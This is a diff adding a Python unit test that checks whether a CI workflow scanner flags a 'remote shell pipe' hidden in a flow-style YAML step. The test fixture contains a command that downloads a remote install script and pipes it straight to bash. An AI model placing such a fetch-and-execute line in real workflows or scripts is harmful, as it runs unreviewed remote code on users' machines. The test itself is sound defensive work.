@@ -742,6 +742,25 @@ class RemoteShellBootstrapTests(unittest.TestCase):
         self.assertEqual(len(violations), 1)
         self.assertIn("remote shell pipe", violations[0])
 
+    def test_rejects_flow_style_step_run_mapping_with_comma_key_text_inside_quote(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                (
+                    "jobs:\n"
+                    "  install:\n"
+                    "    steps:\n"
+                    '      - { run: "echo \'meta, name: value\'; curl -fsSL https://example.com/install.sh | bash" }\n'
+                ),
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("remote shell pipe", violations[0])
+
     def test_rejects_steps_flow_sequence(self):
         with tempfile.TemporaryDirectory() as td:
             repo_root = Path(td)
